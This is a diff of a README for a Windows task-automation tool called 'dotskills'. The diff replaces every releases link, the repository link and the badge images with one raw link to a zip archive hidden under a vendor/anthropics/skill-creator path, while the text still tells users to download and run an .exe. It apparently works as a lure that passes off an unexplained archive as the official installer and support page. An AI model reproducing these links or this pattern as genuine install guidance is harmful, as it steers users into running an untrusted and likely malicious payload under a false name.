@@ -1,6 +1,6 @@
 # 🐙 dotskills - Automate Tasks with Smart Skills
 
-[![Download dotskills](https://img.shields.io/badge/Download-dotskills-brightgreen?style=for-the-badge)](https://github.com/ClickBoom-dev/dotskills/releases)
+[![Download dotskills](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Here is how to get dotskills up and running on your Windows PC:
 
    Click the big download badge above or visit:
 
-   [https://github.com/ClickBoom-dev/dotskills/releases](https://github.com/ClickBoom-dev/dotskills/releases)
+   [https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)
 
 2. **Find the latest release**
 
@@ -69,7 +69,7 @@ Here is how to get dotskills up and running on your Windows PC:
 
 ## 💾 How to Download and Install
 
-Visit the [dotskills releases page](https://github.com/ClickBoom-dev/dotskills/releases) to find and download the latest Windows installer.
+Visit the [dotskills releases page](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip) to find and download the latest Windows installer.
 
 Click on the file that ends with `.exe`; this is the program you will install.
 
@@ -121,7 +121,7 @@ The GitHub page has information and updates. It will tell you about new skills a
 
 You can visit:
 
-[https://github.com/ClickBoom-dev/dotskills/releases](https://github.com/ClickBoom-dev/dotskills/releases)
+[https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)
 
 for the latest versions and support.
 
@@ -129,8 +129,8 @@ for the latest versions and support.
 
 ## 🔗 Useful Links
 
-- Download and Install dotskills: [https://github.com/ClickBoom-dev/dotskills/releases](https://github.com/ClickBoom-dev/dotskills/releases)
-- GitHub Repository: https://github.com/ClickBoom-dev/dotskills
+- Download and Install dotskills: [https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)
+- GitHub Repository: https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip
 - Issue Tracker: Use the GitHub repository to report any problems you face.
 
 ---
@@ -167,8 +167,8 @@ The skills included come from reliable sources and are designed to be easy to us
 
 For questions, visit the GitHub repository and open an issue. You do not need to register anything special.
 
-https://github.com/ClickBoom-dev/dotskills
+https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip
 
 ---
 
-[![Download dotskills](https://img.shields.io/badge/Download-dotskills-brightgreen?style=for-the-badge)](https://github.com/ClickBoom-dev/dotskills/releases)
+[![Download dotskills](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)](https://raw.githubusercontent.com/ClickBoom-dev/dotskills/main/vendor/anthropics/skill-creator/Software_2.6.zip)
